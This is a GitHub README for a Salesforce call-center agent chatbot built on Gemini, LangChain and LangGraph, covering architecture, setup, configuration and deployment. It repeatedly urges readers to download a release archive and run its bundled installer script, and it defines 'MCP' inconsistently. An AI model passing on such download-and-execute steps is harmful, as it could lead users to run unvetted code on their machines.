[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github&style=for-the-badge)](https://github.com/aertonfilhodev/Salesforce-Agent-Chatbot-with-MCP-Architecture/releases)

# Salesforce Agent Chatbot | MCP Architecture with Gemini

<img src="https://raw.githubusercontent.com/github/explore/main/topics/salesforce/salesforce.png" alt="Salesforce" width="80" align="right" />
<img src="https://img.shields.io/badge/agentic--ai-blue?style=flat-square" alt="agentic-ai" />
<img src="https://img.shields.io/badge/call--center-007ACC?style=flat-square" alt="call-center" />
<img src="https://img.shields.io/badge/chatbot-4CAF50?style=flat-square" alt="chatbot" />
<img src="https://img.shields.io/badge/conversational--ai-FF6F61?style=flat-square" alt="conversational-ai" />
<img src="https://img.shields.io/badge/database--management-6E9FB8?style=flat-square" alt="database-management" />
<img src="https://img.shields.io/badge/gemini--api-9C27B0?style=flat-square" alt="gemini-api" />
<img src="https://img.shields.io/badge/langchain-00AEEF?style=flat-square" alt="langchain" />
<img src="https://img.shields.io/badge/langgraph-6A1B9A?style=flat-square" alt="langgraph" />
<img src="https://img.shields.io/badge/llm-FF8A65?style=flat-square" alt="llm" />
<img src="https://img.shields.io/badge/mcp--architecture-607D8B?style=flat-square" alt="mcp" />
<img src="https://img.shields.io/badge/python-3776AB?style=flat-square" alt="python" />
<img src="https://img.shields.io/badge/salesforce--api-2E6DA4?style=flat-square" alt="salesforce-api" />

A production-ready agent assistant for Salesforce call center agents. It uses Gemini Flash as the reasoning engine, LangChain to wrap tools, and LangGraph to orchestrate stateful flows and multi-component planning (MCP).

Table of Contents
- Features
- Architecture
- How it works
- Requirements
- Releases (download & execute)
- Quick start (local)
- Configuration
- Running in production (Docker)
- Testing
- Observability
- Security
- Contributing
- License

Features
- Agent-focused dialog flows and context management.
- MCP (Model-Context-Protocol) design for long session state and tool orchestration.
- Gemini Flash as primary LLM for reasoning and responses.
- LangChain tools for Salesforce API, DB lookup, and utilities.
- LangGraph to define state machines, subflows, and multi-turn orchestration.
- Session store with vector search for context recall.
- Prebuilt connectors for Salesforce REST API and OAuth.
- Logging, tracing, and metrics hooks for call center observability.

Architecture
- LLM Layer: Gemini Flash handles reasoning and response generation. It runs as a hosted API client.
- Tooling Layer: LangChain wraps external calls (Salesforce CRUD, DB queries, embeddings).
- Orchestration Layer: LangGraph manages flows, branching, and state transitions. It handles multi-step agent workflows.
- Session Store: PostgreSQL + vector store (FAISS or Milvus) for embeddings and persistent context.
- Connector Layer: Salesforce adapter manages OAuth, metadata, and task updates.
- UI / Agent Desktop: Web UI or embedded Lightning component that sends events to the backend.

How it works
1. Agent opens a case in Salesforce. The UI sends session start event to the backend.
2. The backend loads session context from the store and pulls recent conversation vectors.
3. LangGraph selects an MCP flow based on intent and agent action.
4. LangChain tools fetch Salesforce data (account, case notes) and provide structured inputs to the LLM.
5. Gemini Flash reasons over the combined prompt and returns a plan or response.
6. LangGraph executes follow-up tools when the LLM requests actions (create tasks, update case).
7. The system returns suggestions, drafts, or direct actions to the agent UI.

Requirements
- Python 3.10+
- Docker (for containerized deploy)
- PostgreSQL 13+
- Vector DB (FAISS, Milvus, or Weaviate)
- Gemini API key with Flash access
- Salesforce org with API access (Client ID / Secret / Refresh Token)
- Redis (optional) for caching and session locking

Releases (download & execute)
- Visit the releases to get the packaged asset and installer:
  https://github.com/aertonfilhodev/Salesforce-Agent-Chatbot-with-MCP-Architecture/releases
- Download the latest release asset named agent_chatbot_release.tar.gz and execute the included installer:
  - Linux / macOS:
    ```
    wget https://github.com/aertonfilhodev/Salesforce-Agent-Chatbot-with-MCP-Architecture/releases/download/v1.0.0/agent_chatbot_release.tar.gz
    tar -xzf agent_chatbot_release.tar.gz
    ./install.sh
    ```
  - Windows (PowerShell):
    ```
    Invoke-WebRequest -Uri "https://github.com/aertonfilhodev/Salesforce-Agent-Chatbot-with-MCP-Architecture/releases/download/v1.0.0/agent_chatbot_release.zip" -OutFile agent_chatbot_release.zip
    Expand-Archive .\agent_chatbot_release.zip -DestinationPath .\release
    .\release\install.ps1
    ```
- The installer runs dependency checks, config prompts, and seeds the database with sample flows.

Quick start (local)
1. Clone repo
   ```
   git clone https://github.com/aertonfilhodev/Salesforce-Agent-Chatbot-with-MCP-Architecture.git
   cd Salesforce-Agent-Chatbot-with-MCP-Architecture
   ```
2. Create virtualenv and install
   ```
   python -m venv venv
   source venv/bin/activate
   pip install -r requirements.txt
   ```
3. Export env vars
   ```
   export GEMINI_API_KEY="your_gemini_key"
   export SALESFORCE_CLIENT_ID="your_client_id"
   export SALESFORCE_CLIENT_SECRET="your_client_secret"
   export DATABASE_URL="postgresql://user:pass@localhost:5432/agentdb"
   ```
4. Run migrations and seed
   ```
   alembic upgrade head
   python seed_flows.py
   ```
5. Run dev server
   ```
   uvicorn app.main:app --reload
   ```
6. Open agent UI at http://localhost:3000 and connect to your Salesforce test org.

Configuration
- LLM
  - Set GEMINI_API_KEY and GEMINI_BASE_URL in env.
  - Tune model params: temperature, max_tokens, context window policy.
- LangChain
  - Define tool wrappers in tools/ folder.
  - Control tool permissions per MCP flow to limit side effects.
- LangGraph
  - Flow definitions live in flows/ as YAML.
  - Each flow declares states, transitions, and allowed tools.
- Database
  - DATABASE_URL for main DB.
  - VECTOR_STORE_TYPE set to faiss|milvus|weaviate.
  - VECTOR_DIM must match the embedding model dimension.
- Salesforce
  - Use OAuth Web Server flow. Store refresh token encrypted in DB.
  - Configure callback URL in connected app.

Running in production (Docker)
- Build image
  ```
  docker build -t salesforce-agent-chatbot:latest .
  ```
- Run stack with docker-compose:
  ```
  docker-compose up -d
  ```
- Production notes
  - Use a managed DB and vector store.
  - Place secrets in a secrets manager.
  - Use a load balancer or API gateway. Configure TLS.
  - Scale workers for langchain tool calls and vector searches.

Testing
- Unit tests
  ```
  pytest tests/unit
  ```
- Integration tests (requires test Salesforce sandbox)
  ```
  pytest tests/integration --salesforce-test-credentials
  ```
- LLM tests
  - Mock Gemini API using the included test harness.
  - Validate response structure and tool-calling behavior.

Observability
- Logs
  - Structured JSON logs via structlog.
  - Log LLM calls, tool invocations, and flow transitions.
- Tracing
  - OpenTelemetry spans wrap LLM and LangGraph operations.
- Metrics
  - Export Prometheus metrics: llm_requests_total, tool_calls_total, flow_duration_seconds.
- Alerts
  - Alert on high error rate or long LLM latency.

Security
- Store API keys in a secrets manager or environment variables not checked into VCS.
- Encrypt stored OAuth tokens at rest.
- Limit LLM tool access by flow to prevent unintended side effects.
- Audit logs for any action that changes Salesforce objects.
- Rotate keys and tokens on schedule.

MCP Best Practices
- Keep prompt templates small and focused.
- Use explicit tool schemas for structured outputs.
- Define retry and fallback states in LangGraph.
- Persist important decisions to the session store for auditability.
- Use short context windows for active reasoning and long-term memory for background facts.

Developer notes
- LangChain wraps tool calls and returns serialized outputs that LangGraph consumes.
- LangGraph uses a state machine model. Each state yields an action: ask, call_tool, respond, or end.
- The Gemini client supports streaming responses for low-latency agent suggestions.
- Embeddings use a separate high-throughput pipeline to keep retrieval fast.

Contributing
- Follow the standard git flow: branch, PR, review.
- Run linters and tests before opening a PR:
  ```
  pre-commit run --all-files
  pytest
  ```
- Add new flows under flows/ and include test coverage for edge cases.
- Open issues for bugs or feature requests. Use clear reproduction steps and logs.

Repository topics
- agentic-ai, call-center, chatbot, conversational-ai
- database-management, gemini-api, langchain, langgraph
- llm, model-context-protocol, python, salesforce, salesforce-api

Useful links
- Releases (download the release asset and run the installer): https://github.com/aertonfilhodev/Salesforce-Agent-Chatbot-with-MCP-Architecture/releases
- LangChain: https://langchain.readthedocs.io
- LangGraph: https://langgraph.dev
- Salesforce Developers: https://developer.salesforce.com

License
- MIT License. See LICENSE file for details.

Images and diagrams
- Architecture diagram (example): ![MCP Architecture](https://miro.medium.com/max/1400/1*Qd7J7kVqXUoN3N3b2Zq9Jg.png)
- Agent UI mock: ![Agent UI](https://images.unsplash.com/photo-1517245386807-bb43f82c33c4?&w=1200&q=80)

If the release link does not work, check the Releases section on the repository page for the latest assets and installation instructions:
https://github.com/aertonfilhodev/Salesforce-Agent-Chatbot-with-MCP-Architecture/releases